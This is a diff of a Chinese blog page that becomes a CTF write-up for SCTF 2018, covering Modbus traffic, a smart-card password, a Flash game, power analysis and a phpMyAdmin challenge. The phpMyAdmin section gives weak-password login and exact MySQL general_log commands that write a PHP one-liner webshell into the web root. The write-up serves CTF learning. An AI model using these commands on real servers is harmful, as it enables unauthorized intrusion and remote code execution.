@@ -79,13 +79,20 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="bak6ry">
-<meta property="og:url" content="http://yoursite.com/archives/2018/07/index.html">
+<meta name="description" content="神奇的Modbus发现是pcapng后缀的，用wireshark打开，过滤modbus，追钟tcp流得到flag.推荐去学下wireshark数据包分析，教程太多了适合自己的才是最好的，我就不分享链接了。 神秘的交易  学习链接：https://bbs.pediy.com/thread-151259.htm 因为题目告知是一张4442的接触式卡，所以对应发送的命令格式为 一个字节指令类型 一个字节">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sctf2018部分wp">
+<meta property="og:url" content="http://yoursite.com/2018/07/23/sctf2018/index.html">
 <meta property="og:site_name" content="bak6ry">
+<meta property="og:description" content="神奇的Modbus发现是pcapng后缀的，用wireshark打开，过滤modbus，追钟tcp流得到flag.推荐去学下wireshark数据包分析，教程太多了适合自己的才是最好的，我就不分享链接了。 神秘的交易  学习链接：https://bbs.pediy.com/thread-151259.htm 因为题目告知是一张4442的接触式卡，所以对应发送的命令格式为 一个字节指令类型 一个字节">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/ctf/1.png">
+<meta property="og:image" content="http://yoursite.com/ctf/2.png">
+<meta property="og:updated_time" content="2018-08-02T01:19:46.027Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="bak6ry">
+<meta name="twitter:title" content="sctf2018部分wp">
+<meta name="twitter:description" content="神奇的Modbus发现是pcapng后缀的，用wireshark打开，过滤modbus，追钟tcp流得到flag.推荐去学下wireshark数据包分析，教程太多了适合自己的才是最好的，我就不分享链接了。 神秘的交易  学习链接：https://bbs.pediy.com/thread-151259.htm 因为题目告知是一张4442的接触式卡，所以对应发送的命令格式为 一个字节指令类型 一个字节">
+<meta name="twitter:image" content="http://yoursite.com/ctf/1.png">
 
 
 
@@ -115,7 +122,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/archives/2018/07/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/07/23/sctf2018/"/>
 
 
 
@@ -131,7 +138,7 @@
   </script>
 
 
-  <title>归档 | bak6ry</title>
+  <title>sctf2018部分wp | bak6ry</title>
   
 
 
@@ -150,7 +157,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 	<a href="https://github.com/The7sins"  class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
 
@@ -245,111 +252,185 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
-
-      <span class="archive-page-counter">
-        
-        
-        
-          
-        
-        嗯..! 目前共计 8 篇日志。 继续努力。
-      </span>
-
-      
-
-        
-        
-        
-
-        
-          
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2018">2018</h1>
-          </div>
-        
-        
-
-        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/23/sctf2018/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="bak6ry">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="bak6ry">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2018/07/23/巅峰极客/" itemprop="url">
-              
-                <span itemprop="name">巅峰极客2018第一场部分wp</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">sctf2018部分wp</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-07-23T10:49:00+08:00"
-              content="2018-07-23" >
-          07-23
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-23T09:49:00+08:00">
+                2018-07-23
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/比赛/" itemprop="url" rel="index">
+                    <span itemprop="name">比赛</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/07/23/sctf2018/" itemprop="url">
-              
-                <span itemprop="name">sctf2018部分wp</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-07-23T09:49:00+08:00"
-              content="2018-07-23" >
-          07-23
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
+      
+        <p>神奇的Modbus<br>发现是pcapng后缀的，用wireshark打开，过滤modbus，追钟tcp流得到flag.<br>推荐去学下wireshark数据包分析，教程太多了适合自己的才是最好的，我就不分享链接了。</p>
+<p>神秘的交易<br> <img src="/ctf/1.png" alt=""><br><img src="/ctf/2.png" alt=""></p>
+<p>学习链接：<a href="https://bbs.pediy.com/thread-151259.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-151259.htm</a></p>
+<p>因为题目告知是一张4442的接触式卡，所以对应发送的命令格式为 一个字节指令类型 一个字节地址 一个字节数据</p>
+<p>物体会依次发送该数据包到卡片，其中s1 s2 s3拼在一起就是那三个字节的口令了！</p>
+<ol>
+<li>.找数据s1 在中间标线处找到0x33<br>的二进制：11001100（注意数完一个字节）</li>
+</ol>
+<p>(数完八个)</p>
+<ol start="2">
+<li>找 中的0x01依次向右数的第二个字节为0x01的二进制(每个字节是八位，所有数八个)接下来的一个字节就是s1了，注意！！！！数据从低位到高位的顺序发送，所以读完8个过后要倒一下，</li>
+<li>二进制转16进制（题目要求的）</li>
+<li>同理可以找到s2和s3. s1,s2,s3拼接起来为加密密钥。</li>
+</ol>
+<p>肥宅快乐题<br>我很喜欢这个题，拿道题的第一反应就是玩，真的是肥宅快乐题。我很快乐，但我不胖。拿到题看到Flash游戏，通关后，注意与NPC的对话哦;)我是真想去通关，正好做题做的好累，但是发现通关一个游戏更累就放弃了，或许这就是我做这个题的动力吧。于是想到下载个flash的反编译软件： 然后打开文件 ，游戏里所有对话一定写在这某个地方，发现动作里有源代码，搜索游戏中开场的对话，发现每句前面有t0,t1,t2来标识。马上想到可以通过搜索t0找到所有段对话的开始，然后，去最后的几个的t0那里应该就是游戏结束的地方了，果不其然，<br>：找到了flag，base64解密后获得。这里说个ctf心得吧，我这个题本来可以前三个做出来的，结果上了个厕所，在厕所里玩了会手机，就变成第8个了，所以，做题要专注。。。。。。</p>
+<p>侧信道初探<br>学习链接：<a href="https://g2ex.github.io/2016/05/31/Power-Analysis-Attacks-on-Smart-Card/" target="_blank" rel="noopener">https://g2ex.github.io/2016/05/31/Power-Analysis-Attacks-on-Smart-Card/</a></p>
+<p>简单的能量分析攻击（SPA）真的很简单， 密钥位为 0 时运算的功耗和密钥位为 1 时运算的功耗存在差异，通过这样的差异分析出密钥位的值，按照一定规律组合得到完整的密钥<br>以 为分界线分，可以分成10份，然后按照波长也就是宽度。宽的能量消耗大也就对应1，窄的对应0，最后数出来是得flag，之前一直弄不对，最后发现SCTF大写就对了，真的是这里卡太久了，签到题上面都是小写，哎经验不足，丢失大量时间，以后吸取教训。<br>easiest web - phpmyadmin<br>学习链接： <a href="http://www.kernelpicnic.net/2016/03/06/BKPCTF-Suffolk-Downs-Bug-Bounty-Write-Up.html" target="_blank" rel="noopener">http://www.kernelpicnic.net/2016/03/06/BKPCTF-Suffolk-Downs-Bug-Bounty-Write-Up.html</a></p>
+<p>Web服务器现在关了，进不去了，所以就没法附图了，不好意思，不过学习链接的题和这个很像，wp也很详细。推荐去看一波。<br>root/root 弱口令进phpmyAdmin<br>收集下信息，翻看下数据库表，没啥发现<br>尝试写shell，随便猜个路径 /var/www/html<br>失败，提示开启了安全模式<br>尝试利用mysql日志文件写shell<br>show variables like “%general_log”;– 查看变量，发现general_log_file值为c:\phpStudy\mysql\xxx<br>看到phpstudy，猜测网站根目录为phpstudy/www目录</p>
+<p>set global general_log=”ON”;– 开启mysql日志<br>set global general_log_file=”c:/phpstudy/www/shell.php”;– 设置日志保存路径<br>select “&lt;?php @$_GET<a href="$_POST[&#39;c&#39;]">‘f’</a>;?&gt;”;– 写shell<br>菜刀连接，flag在c盘下</p>
+
+      
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/11/mysql操作手册/" rel="next" title="sqlmap">
+                <i class="fa fa-chevron-left"></i> sqlmap
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/07/23/巅峰极客/" rel="prev" title="巅峰极客2018第一场部分wp">
+                巅峰极客2018第一场部分wp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -357,6 +438,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -569,6 +654,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
